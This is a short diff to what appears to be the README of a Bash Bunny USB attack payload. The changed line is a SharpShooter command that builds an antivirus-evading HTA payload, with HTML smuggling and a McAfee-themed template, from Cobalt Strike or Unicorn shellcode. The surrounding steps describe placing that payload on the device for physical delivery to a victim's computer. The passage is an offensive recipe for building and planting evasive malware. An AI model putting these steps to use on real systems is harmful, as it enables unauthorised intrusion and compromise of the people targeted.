@@ -2,7 +2,7 @@
 
 1) Create the HTA payload using Cobalt Strike / Unicorn whatever and SharpShooter for evasion
 
-'python SharpShooter.py  --dotnetver 2  --payload hta --rawscfile payload.bin --smuggle --output payload --template mcafee --stageless'
+```python SharpShooter.py  --dotnetver 2  --payload hta --rawscfile payload.bin --smuggle --output payload --template mcafee --stageless```
 
 2) Place the script and the payload.hta in either the Switch1 or Switch2 folder of the Bash Bunny
 
